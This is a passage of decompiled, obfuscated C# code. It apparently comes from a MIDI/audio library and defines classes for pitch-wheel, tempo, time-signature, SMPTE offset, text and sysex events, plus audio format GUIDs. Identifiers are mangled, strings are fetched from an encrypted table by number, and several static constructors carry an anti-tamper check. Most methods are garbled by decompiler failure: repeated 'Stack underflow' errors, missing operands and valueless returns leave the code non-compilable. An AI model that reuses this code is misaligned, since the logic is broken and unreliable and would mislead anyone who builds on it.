				_0080._0014._0001(107381115),
				_0080._0014._0001(107381106),
				_0080._0014._0001(107381065),
				_0080._0014._0001(107381080),
				_0080._0014._0001(107381027),
				_0080._0014._0001(107381002),
				_0080._0014._0001(107381009),
				_0080._0014._0001(107413220),
				_0080._0014._0001(107413195),
				_0080._0014._0001(107413202),
				_0080._0014._0001(107413181),
				_0080._0014._0001(107413128),
				_0080._0014._0001(107413143),
				_0080._0014._0001(107413094),
				_0080._0014._0001(107413109),
				_0080._0014._0001(107413056),
				_0080._0014._0001(107413075),
				_0080._0014._0001(107413030),
				_0080._0014._0001(107413053),
				_0080._0014._0001(107413000),
				_0080._0014._0001(107413015),
				_0080._0014._0001(107413474),
				_0080._0014._0001(107413489),
				_0080._0014._0001(107413440),
				_0080._0014._0001(107413423),
				_0080._0014._0001(107413410),
				_0080._0014._0001(107413429),
				_0080._0014._0001(107413380),
				_0080._0014._0001(107413403),
				_0080._0014._0001(107413354),
				_0080._0014._0001(107413373),
				_0080._0014._0001(107413360),
				_0080._0014._0001(107413315),
				_0080._0014._0001(107413338),
				_0080._0014._0001(107413293),
				_0080._0014._0001(107413280),
				_0080._0014._0001(107413263),
				_0080._0014._0001(107413278),
				_0080._0014._0001(107413265),
				_0080._0014._0001(107412708),
				_0080._0014._0001(107412687),
				_0080._0014._0001(107412694),
				_0080._0014._0001(107412669),
				_0080._0014._0001(107412616),
				_0080._0014._0001(107412591),
				_0080._0014._0001(107412602),
				_0080._0014._0001(107412549),
				_0080._0014._0001(107412524),
				_0080._0014._0001(107412535),
				_0080._0014._0001(107412486),
				_0080._0014._0001(107412973),
				_0080._0014._0001(107412984),
				_0080._0014._0001(107412931),
				_0080._0014._0001(107412906),
				_0080._0014._0001(107412921),
				_0080._0014._0001(107412868),
				_0080._0014._0001(107412883),
				_0080._0014._0001(107412858),
				_0080._0014._0001(107412805),
				_0080._0014._0001(107412780),
				_0080._0014._0001(107412787),
				_0080._0014._0001(107412766),
				_0080._0014._0001(107412201),
				_0080._0014._0001(107412212),
				_0080._0014._0001(107412171),
				_0080._0014._0001(107412162),
				_0080._0014._0001(107412181),
				_0080._0014._0001(107412140),
				_0080._0014._0001(107412159),
				_0080._0014._0001(107412146),
				_0080._0014._0001(107412105),
				_0080._0014._0001(107412096),
				_0080._0014._0001(107412079),
				_0080._0014._0001(107412070),
				_0080._0014._0001(107412085),
				_0080._0014._0001(107412040),
				_0080._0014._0001(107412055),
				_0080._0014._0001(107412006),
				_0080._0014._0001(107412021),
				_0080._0014._0001(107411968),
				_0080._0014._0001(107412455),
				_0080._0014._0001(107412470),
				_0080._0014._0001(107412425),
				_0080._0014._0001(107412440),
				_0080._0014._0001(107412387),
				_0080._0014._0001(107412402),
				_0080._0014._0001(107412357)
			};
		}
	}
}
namespace _001C
{
	internal sealed class _000E : global::_0013._0010
	{
		private new int m__0001;

		public int Pitch
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_0003: Invalid comparison between Unknown and I4
				//IL_000c: Invalid comparison between Unknown and I4
				//IL_002e: Incompatible stack heights: 0 vs 1
				//IL_0031: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				if ((int)/*Error near IL_0005: Stack underflow*/ < 0 || (int)/*Error near IL_000e: Stack underflow*/ >= 16384)
				{
					_0080._0014._0001(107388827);
					throw new ArgumentOutOfRangeException(message: _0080._0014._0001(107412225), paramName: (string?)/*Error near IL_0024: Stack underflow*/);
				}
				this.m__0001 = value;
			}
		}

		public _000E(BinaryReader _0086_0088_0003)
		{
			byte b = _0086_0088_0003.ReadByte();
			byte b2 = _0086_0088_0003.ReadByte();
			if ((b & 0x80u) != 0)
			{
				throw new FormatException(_0080._0014._0001(107412376));
			}
			if ((b2 & 0x80u) != 0)
			{
				throw new FormatException(_0080._0014._0001(107412299));
			}
			this.m__0001 = b + (b2 << 7);
		}

		public _000E(long _0004_0091_0006, int _008D_0090_0006, int _001C_0091_0006)
			: base(_0004_0091_0006, _008D_0090_0006, MidiCommandCode.PitchWheelChange)
		{
			Pitch = _001C_0091_0006;
		}

		public override string ToString()
		{
			//IL_0037: Incompatible stack heights: 0 vs 2
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 1
			_ = _0089_0002._0092_0005;
			_0080._0014._0001(107412286);
			((global::_0013._0010)/*Error near IL_0041: Stack underflow*/).ToString();
			object obj = this.m__0001;
			object obj2 = this.m__0001 - 8192;
			return /*Error near IL_0031: Stack underflow*/((string)/*Error near IL_0031: Stack underflow*/, (object)/*Error near IL_0031: Stack underflow*/, obj, obj2);
		}

		public override int _0001()
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_001f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected I4, but got Unknown
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			((global::_0013._0010)/*Error near IL_0029: Stack underflow*/)._0001();
			int num = ((_000E)/*Error near IL_000b: Stack underflow*/).m__0001;
			return /*Error near IL_0011: Stack underflow*/+ ((num & 0x7F) << 8) + (((this.m__0001 >> 7) & 0x7F) << 16);
		}

		public unsafe override void _0001(ref long _0002, BinaryWriter _0003)
		{
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			((global::_0013._0010)/*Error near IL_000b: Stack underflow*/)._0001(ref *(long*)/*Error near IL_000b: Stack underflow*/, (BinaryWriter)/*Error near IL_000b: Stack underflow*/);
			_0084_0003._007E_007F_0007(_0003, (byte)((uint)this.m__0001 & 0x7Fu));
			_0084_0003._007E_007F_0007(_0003, (byte)((uint)(this.m__0001 >> 7) & 0x7Fu));
		}
	}
}
namespace _000E
{
	internal sealed class _0015 : global::_0014._0011
	{
		private new byte[] m__0001;

		public byte[] Data
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0015)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_001a: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 1
				//IL_0020: Incompatible stack heights: 0 vs 1
				((_0015)/*Error near IL_0009: Stack underflow*/).m__0001 = (byte[])/*Error near IL_0009: Stack underflow*/;
				IntPtr intPtr = (nint)this.m__0001.LongLength;
				((global::_0014._0011)/*Error near IL_0018: Stack underflow*/)._0001 = (int)(nint)intPtr;
			}
		}

		public _0015(BinaryReader _0086_0088_0003, int _0089_0010)
		{
			this.m__0001 = _0086_0088_0003.ReadBytes(_0089_0010);
		}

		public _0015(byte[] _0087_000F, long _0004_0091_0006)
			: base(MetaEventType.SequencerSpecific, _0087_000F.Length, _0004_0091_0006)
		{
			this.m__0001 = _0087_000F;
		}

		public override global::_0013._0010 _0001()
		{
			//IL_0021: Incompatible stack heights: 0 vs 2
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			_ = _0083_0003._007E_0018_0007;
			byte[] array = ((_0015)/*Error near IL_000c: Stack underflow*/).m__0001;
			/*Error near IL_0028: Stack underflow*/(array);
			_ = (byte[])/*Error near IL_000f: Stack underflow*/;
			return new _0015(_0004_0091_0006: ((global::_0013._0010)/*Error near IL_001a: Stack underflow*/)._0001, _0087_000F: (byte[])/*Error near IL_001f: Stack underflow*/);
		}

		public override string ToString()
		{
			//IL_0091: Incompatible stack heights: 0 vs 1
			//IL_009d: Incompatible stack heights: 0 vs 2
			new StringBuilder();
			StringBuilder stringBuilder = (StringBuilder)/*Error near IL_0097: Stack underflow*/;
			_ = _008B_0002._007E_0094_0005;
			string text = base.ToString();
			/*Error near IL_001f: Stack underflow*/((object)/*Error near IL_001f: Stack underflow*/, text);
			_008B_0002._007E_0094_0005(stringBuilder, _0080._0014._0001(107411652));
			byte[] array = this.m__0001;
			foreach (byte b in array)
			{
				_008C_0002._007E_0095_0005(stringBuilder, _0080._0014._0001(107411679), b);
			}
			_009D_0002 obj = _009D_0002._007E_0018_0006;
			int i = stringBuilder.Length;
			obj(stringBuilder, i - 1);
			return global::_0002._007E_0006(stringBuilder);
		}

		public unsafe override void _0001(ref long _0002, BinaryWriter _0003)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			((global::_0014._0011)/*Error near IL_000b: Stack underflow*/)._0001(ref *(long*)/*Error near IL_000b: Stack underflow*/, (BinaryWriter)/*Error near IL_000b: Stack underflow*/);
			_009F_0002._007E_001C_0006(_0003, this.m__0001);
		}

		static _0015()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0013
{
	internal sealed class _0012 : global::_0014._0011
	{
		private new byte m__0001;

		private new byte _0002;

		private byte _0003;

		private byte _0004;

		private byte _0005;

		public int Hours => ((_0012)/*Error near IL_0007: Stack underflow*/).m__0001;

		public int Minutes => ((_0012)/*Error near IL_0007: Stack underflow*/)._0002;

		public int Seconds => ((_0012)/*Error near IL_0007: Stack underflow*/)._0003;

		public int Frames => ((_0012)/*Error near IL_0007: Stack underflow*/)._0004;

		public int SubFrames => ((_0012)/*Error near IL_0007: Stack underflow*/)._0005;

		public _0012(byte _001D_0091_0006, byte _001E_0091_0006, byte _0012_0013_0006, byte _001F_0091_0006, byte _007F_0091_0006)
		{
			this.m__0001 = _001D_0091_0006;
			_0002 = _001E_0091_0006;
			_0003 = _0012_0013_0006;
			_0004 = _001F_0091_0006;
			_0005 = _007F_0091_0006;
		}

		public _0012(BinaryReader _0086_0088_0003, int _0089_0010)
		{
			if (_0089_0010 != 5)
			{
				throw new FormatException(string.Format(_0080._0014._0001(107411666), _0089_0010));
			}
			this.m__0001 = _0086_0088_0003.ReadByte();
			_0002 = _0086_0088_0003.ReadByte();
			_0003 = _0086_0088_0003.ReadByte();
			_0004 = _0086_0088_0003.ReadByte();
			_0005 = _0086_0088_0003.ReadByte();
		}

		public override _0010 _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 2
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = _0083_0003._0019_0007;
			/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/);
			return (_0012)/*Error near IL_000a: Stack underflow*/;
		}

		public override string ToString()
		{
			//IL_006a: Incompatible stack heights: 0 vs 2
			//IL_006d: Incompatible stack heights: 0 vs 4
			//IL_0074: Incompatible stack heights: 0 vs 1
			_ = _009E._0094_0004;
			_0080._0014._0001(107411601);
			_ = new object[6];
			_ = 0;
			((global::_0014._0011)/*Error near IL_0074: Stack underflow*/).ToString();
			((object[])/*Error near IL_0019: Stack underflow*/)[/*Error near IL_0019: Stack underflow*/] = (object)/*Error near IL_0019: Stack underflow*/;
			((object[])/*Error near IL_0019: Stack underflow*/)[1] = this.m__0001;
			((object[])/*Error near IL_0027: Stack underflow*/)[2] = _0002;
			((object[])/*Error near IL_0035: Stack underflow*/)[3] = _0003;
			((object[])/*Error near IL_0043: Stack underflow*/)[4] = _0004;
			((object[])/*Error near IL_0051: Stack underflow*/)[5] = _0005;
			return /*Error near IL_0064: Stack underflow*/((string)/*Error near IL_0064: Stack underflow*/, (object[])/*Error near IL_0064: Stack underflow*/);
		}

		public unsafe override void _0001(ref long _0002, BinaryWriter _0003)
		{
			//IL_0062: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 1
			//IL_0068: Incompatible stack heights: 0 vs 1
			((global::_0014._0011)/*Error near IL_000b: Stack underflow*/)._0001(ref *(long*)/*Error near IL_000b: Stack underflow*/, (BinaryWriter)/*Error near IL_000b: Stack underflow*/);
			_0084_0003._007E_007F_0007(_0003, this.m__0001);
			_0084_0003._007E_007F_0007(_0003, this._0002);
			_0084_0003._007E_007F_0007(_0003, this._0003);
			_0084_0003._007E_007F_0007(_0003, _0004);
			_0084_0003._007E_007F_0007(_0003, _0005);
		}
	}
}
namespace _0018
{
	internal sealed class _0014 : global::_0013._0010
	{
		internal new byte[] _0001;

		public override global::_0013._0010 _0001()
		{
			//IL_0022: Incompatible stack heights: 0 vs 3
			new _0014();
			byte[] obj = (byte[])((_0014)/*Error near IL_000d: Stack underflow*/)._0001?.Clone();
			((_0014)/*Error near IL_0020: Stack underflow*/)._0001 = obj;
			return (global::_0013._0010)/*Error near IL_0021: Stack underflow*/;
		}

		public override string ToString()
		{
			//IL_007d: Incompatible stack heights: 0 vs 1
			//IL_0089: Incompatible stack heights: 0 vs 1
			new StringBuilder();
			StringBuilder stringBuilder = (StringBuilder)/*Error near IL_0083: Stack underflow*/;
			byte[] array = ((_0014)/*Error near IL_0011: Stack underflow*/)._0001;
			foreach (byte b in array)
			{
				_008C_0002._007E_0095_0005(stringBuilder, _0080._0014._0001(107411679), b);
			}
			return _0089_0002._0092_0005(_0080._0014._0001(107411568), base._0001, this._0001.Length, global::_0002._007E_0006(stringBuilder));
		}

		public unsafe override void _0001(ref long _0002, BinaryWriter _0003)
		{
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 1
			((global::_0013._0010)/*Error near IL_000b: Stack underflow*/)._0001(ref *(long*)/*Error near IL_000b: Stack underflow*/, (BinaryWriter)/*Error near IL_000b: Stack underflow*/);
			_0083._007E_000E_0004(_0003, this._0001, 0, this._0001.Length);
			_0084_0003._007E_007F_0007(_0003, 247);
		}

		static _0014()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0011
{
	internal sealed class _000F : global::_0014._0011
	{
		private new int m__0001;

		public int MicrosecondsPerQuarterNote
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000F)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000F)/*Error near IL_0009: Stack underflow*/).m__0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public double Tempo
		{
			get
			{
				//IL_0011: Unknown result type (might be due to invalid IL or missing references)
				//IL_0013: Expected F8, but got Unknown
				//IL_0014: Incompatible stack heights: 0 vs 2
				_ = 60000000.0;
				int num = ((_000F)/*Error near IL_0010: Stack underflow*/).m__0001;
				return /*Error near IL_0012: Stack underflow*// (double)num;
			}
			set
			{
				//IL_000d: Unknown result type (might be due to invalid IL or missing references)
				//IL_0016: Incompatible stack heights: 0 vs 1
				//IL_0019: Incompatible stack heights: 0 vs 2
				_ = 60000000.0;
				_003F val = /*Error near IL_000e: Stack underflow*// /*Error near IL_000e: Stack underflow*/;
				((_000F)/*Error near IL_0014: Stack underflow*/).m__0001 = (int)val;
			}
		}

		public _000F(BinaryReader _0086_0088_0003, int _0089_0010)
		{
			if (_0089_0010 != 3)
			{
				throw new FormatException(_0080._0014._0001(107411499));
			}
			this.m__0001 = (_0086_0088_0003.ReadByte() << 16) + (_0086_0088_0003.ReadByte() << 8) + _0086_0088_0003.ReadByte();
		}

		public _000F(int _0080_0091_0006, long _0004_0091_0006)
			: base(MetaEventType.SetTempo, 3, _0004_0091_0006)
		{
			this.m__0001 = _0080_0091_0006;
		}

		public override global::_0013._0010 _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 2
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = _0083_0003._0019_0007;
			/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/);
			return (_000F)/*Error near IL_000a: Stack underflow*/;
		}

		public override string ToString()
		{
			//IL_0037: Incompatible stack heights: 0 vs 2
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 1
			_ = _0089_0002._0092_0005;
			_0080._0014._0001(107411470);
			((global::_0014._0011)/*Error near IL_0041: Stack underflow*/).ToString();
			object obj = this.m__0001;
			object obj2 = 60000000 / this.m__0001;
			return /*Error near IL_0031: Stack underflow*/((string)/*Error near IL_0031: Stack underflow*/, (object)/*Error near IL_0031: Stack underflow*/, obj, obj2);
		}

		public unsafe override void _0001(ref long _0002, BinaryWriter _0003)
		{
			//IL_005a: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 1
			//IL_0060: Incompatible stack heights: 0 vs 1
			((global::_0014._0011)/*Error near IL_000b: Stack underflow*/)._0001(ref *(long*)/*Error near IL_000b: Stack underflow*/, (BinaryWriter)/*Error near IL_000b: Stack underflow*/);
			_0084_0003._007E_007F_0007(_0003, (byte)((uint)(this.m__0001 >> 16) & 0xFFu));
			_0084_0003._007E_007F_0007(_0003, (byte)((uint)(this.m__0001 >> 8) & 0xFFu));
			_0084_0003._007E_007F_0007(_0003, (byte)((uint)this.m__0001 & 0xFFu));
		}
	}
}
namespace _0010
{
	internal sealed class _0011 : global::_0014._0011
	{
		private new string m__0001;

		public string Text
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0011)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0025: Incompatible stack heights: 0 vs 1
				//IL_0028: Incompatible stack heights: 0 vs 1
				((_0011)/*Error near IL_0009: Stack underflow*/).m__0001 = (string)/*Error near IL_0009: Stack underflow*/;
				int num = global::_001A._007E_0016_0003(this.m__0001);
				((global::_0014._0011)/*Error near IL_0020: Stack underflow*/)._0001 = num;
			}
		}

		public _0011(BinaryReader _0086_0088_0003, int _0089_0010)
		{
			Encoding encoding = global::_000E._0012._0001;
			this.m__0001 = encoding.GetString(_0086_0088_0003.ReadBytes(_0089_0010));
		}

		public _0011(string _0019_008E_0003, MetaEventType _0003_0091_0006, long _0004_0091_0006)
			: base(_0003_0091_0006, _0019_008E_0003.Length, _0004_0091_0006)
		{
			this.m__0001 = _0019_008E_0003;
		}

		public override global::_0013._0010 _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 2
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = _0083_0003._0019_0007;
			/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/);
			return (_0011)/*Error near IL_000a: Stack underflow*/;
		}

		public override string ToString()
		{
			//IL_0021: Incompatible stack heights: 0 vs 2
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			_ = _009D._0093_0004;
			global::_0080._0014._0001(107395853);
			((global::_0014._0011)/*Error near IL_002b: Stack underflow*/).ToString();
			string text = this.m__0001;
			return /*Error near IL_001b: Stack underflow*/((string)/*Error near IL_001b: Stack underflow*/, (object)/*Error near IL_001b: Stack underflow*/, text);
		}

		public unsafe override void _0001(ref long _0002, BinaryWriter _0003)
		{
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 1
			((global::_0014._0011)/*Error near IL_000b: Stack underflow*/)._0001(ref *(long*)/*Error near IL_000b: Stack underflow*/, (BinaryWriter)/*Error near IL_000b: Stack underflow*/);
			byte[] array = _0087_0003._007E_0081_0007(global::_000E._0012._0001, this.m__0001);
			_009F_0002._007E_001C_0006(_0003, array);
		}

		static _0011()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _001B
{
	internal sealed class _0012 : global::_0014._0011
	{
		private new byte m__0001;

		private new byte _0002;

		private byte _0003;

		private byte _0004;

		public int Numerator => ((_0012)/*Error near IL_0007: Stack underflow*/).m__0001;

		public int Denominator => ((_0012)/*Error near IL_0007: Stack underflow*/)._0002;

		public int TicksInMetronomeClick => ((_0012)/*Error near IL_0007: Stack underflow*/)._0003;

		public int No32ndNotesInQuarterNote => ((_0012)/*Error near IL_0007: Stack underflow*/)._0004;

		public string TimeSignature
		{
			get
			{
				//IL_00ae: Incompatible stack heights: 0 vs 2
				//IL_00b4: Incompatible stack heights: 0 vs 1
				//IL_00be: Incompatible stack heights: 0 vs 1
				_ = _0008_0002._0007_0005;
				_0080._0014._0001(107411920);
				object obj = ((_0012)/*Error near IL_0019: Stack underflow*/)._0002;
				/*Error near IL_00be: Stack underflow*/((string)/*Error near IL_00be: Stack underflow*/, obj);
				string text = (string)/*Error near IL_0024: Stack underflow*/;
				switch (_0002)
				{
				case 1:
					text = _0080._0014._0001(107411899);
					break;
				case 2:
					text = _0080._0014._0001(107411894);
					break;
				case 3:
					text = _0080._0014._0001(107411889);
					break;
				case 4:
					text = _0080._0014._0001(107411852);
					break;
				case 5:
					text = _0080._0014._0001(107411847);
					break;
				}
				return _009D._0093_0004(_0080._0014._0001(107411842), this.m__0001, text);
			}
		}

		public _0012(BinaryReader _0086_0088_0003, int _0089_0010)
		{
			if (_0089_0010 != 4)
			{
				throw new FormatException(string.Format(_0080._0014._0001(107411477), _0089_0010));
			}
			this.m__0001 = _0086_0088_0003.ReadByte();
			_0002 = _0086_0088_0003.ReadByte();
			_0003 = _0086_0088_0003.ReadByte();
			_0004 = _0086_0088_0003.ReadByte();
		}

		public _0012(long _0004_0091_0006, int _0081_0091_0006, int _0082_0091_0006, int _0083_0091_0006, int _0084_0091_0006)
			: base(MetaEventType.TimeSignature, 4, _0004_0091_0006)
		{
			this.m__0001 = (byte)_0081_0091_0006;
			_0002 = (byte)_0082_0091_0006;
			_0003 = (byte)_0083_0091_0006;
			_0004 = (byte)_0084_0091_0006;
		}

		public override global::_0013._0010 _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 2
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = _0083_0003._0019_0007;
			/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/);
			return (_0012)/*Error near IL_000a: Stack underflow*/;
		}

		public override string ToString()
		{
			//IL_0049: Incompatible stack heights: 0 vs 2
			//IL_004c: Incompatible stack heights: 0 vs 4
			//IL_0053: Incompatible stack heights: 0 vs 1
			_ = _009E._0094_0004;
			_0080._0014._0001(107411861);
			_ = new object[4];
			_ = 0;
			((global::_0014._0011)/*Error near IL_0053: Stack underflow*/).ToString();
			((object[])/*Error near IL_0019: Stack underflow*/)[/*Error near IL_0019: Stack underflow*/] = (object)/*Error near IL_0019: Stack underflow*/;
			((object[])/*Error near IL_0019: Stack underflow*/)[1] = TimeSignature;
			((object[])/*Error near IL_0022: Stack underflow*/)[2] = _0003;
			((object[])/*Error near IL_0030: Stack underflow*/)[3] = _0004;
			return /*Error near IL_0043: Stack underflow*/((string)/*Error near IL_0043: Stack underflow*/, (object[])/*Error near IL_0043: Stack underflow*/);
		}

		public unsafe override void _0001(ref long _0002, BinaryWriter _0003)
		{
			//IL_0051: Incompatible stack heights: 0 vs 1
			//IL_0054: Incompatible stack heights: 0 vs 1
			//IL_0057: Incompatible stack heights: 0 vs 1
			((global::_0014._0011)/*Error near IL_000b: Stack underflow*/)._0001(ref *(long*)/*Error near IL_000b: Stack underflow*/, (BinaryWriter)/*Error near IL_000b: Stack underflow*/);
			_0084_0003._007E_007F_0007(_0003, this.m__0001);
			_0084_0003._007E_007F_0007(_0003, this._0002);
			_0084_0003._007E_007F_0007(_0003, this._0003);
			_0084_0003._007E_007F_0007(_0003, _0004);
		}
	}
}
namespace _0014
{
	internal sealed class _0012 : _0011
	{
		private new ushort m__0001;

		public _0012(ushort _0086_0091_0006)
		{
			this.m__0001 = _0086_0091_0006;
		}

		public _0012(BinaryReader _0086_0088_0003, int _0089_0010)
		{
			if (_0089_0010 != 2)
			{
				throw new FormatException(_0080._0014._0001(107411796));
			}
			this.m__0001 = (ushort)((_0086_0088_0003.ReadByte() << 8) + _0086_0088_0003.ReadByte());
		}

		public override global::_0013._0010 _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 2
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = _0083_0003._0019_0007;
			/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/);
			return (_0012)/*Error near IL_000a: Stack underflow*/;
		}

		public override string ToString()
		{
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			_ = _009D._0093_0004;
			_0080._0014._0001(107395853);
			((_0011)/*Error near IL_0030: Stack underflow*/).ToString();
			object obj = this.m__0001;
			return /*Error near IL_0020: Stack underflow*/((string)/*Error near IL_0020: Stack underflow*/, (object)/*Error near IL_0020: Stack underflow*/, obj);
		}

		public unsafe override void _0001(ref long _0002, BinaryWriter _0003)
		{
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 1
			((_0011)/*Error near IL_000b: Stack underflow*/)._0001(ref *(long*)/*Error near IL_000b: Stack underflow*/, (BinaryWriter)/*Error near IL_000b: Stack underflow*/);
			_0084_0003._007E_007F_0007(_0003, (byte)((uint)(this.m__0001 >> 8) & 0xFFu));
			_0084_0003._007E_007F_0007(_0003, (byte)(this.m__0001 & 0xFFu));
		}

		static _0012()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001F
{
	internal static class _0011
	{
		[global::_0007._0010("AAC")]
		public static readonly Guid _0001;

		[global::_0007._0010("ADTS")]
		public static readonly Guid _0002;

		[global::_0007._0010("Dolby AC3 SPDIF")]
		public static readonly Guid _0003;

		[global::_0007._0010("DRM")]
		public static readonly Guid _0004;

		[global::_0007._0010("DTS")]
		public static readonly Guid _0005;

		[global::_0007._0010("IEEE floating-point")]
		public static readonly Guid _0006;

		[global::_0007._0010("MP3")]
		public static readonly Guid _0007;

		[global::_0007._0010("MPEG")]
		public static readonly Guid _0008;

		[global::_0007._0010("WMA 9 Voice codec")]
		public static readonly Guid _000E;

		[global::_0007._0010("PCM")]
		public static readonly Guid _000F;

		[global::_0007._0010("WMA SPDIF")]
		public static readonly Guid _0010;

		[global::_0007._0010("WMAudio Lossless")]
		public static readonly Guid _0011;

		[global::_0007._0010("Windows Media Audio")]
		public static readonly Guid _0012;

		[global::_0007._0010("Windows Media Audio Professional")]
		public static readonly Guid _0013;

		[global::_0007._0010("Dolby AC3")]
		public static readonly Guid _0014;

		[global::_0007._0010("MPEG-4 and AAC Audio Types")]
		public static readonly Guid _0015;

		[global::_0007._0010("Dolby Audio Types")]
		public static readonly Guid _0016;

		[global::_0007._0010("Dolby Audio Types")]
		public static readonly Guid _0017;

		[global::_0007._0010("μ-law")]
		public static readonly Guid _0018;

		[global::_0007._0010("ADPCM")]
		public static readonly Guid _0019;

		[global::_0007._0010("Dolby Digital Plus for HDMI")]
		public static readonly Guid _001A;

		[global::_0007._0010("MSAudio1")]
		public static readonly Guid _001B;

		[global::_0007._0010("IMA ADPCM")]
		public static readonly Guid _001C;

		[global::_0007._0010("WMSP2")]
		public static readonly Guid _001D;

		static _0011()
		{
			//IL_01e6: Incompatible stack heights: 0 vs 1
			//IL_01f0: Incompatible stack heights: 0 vs 1
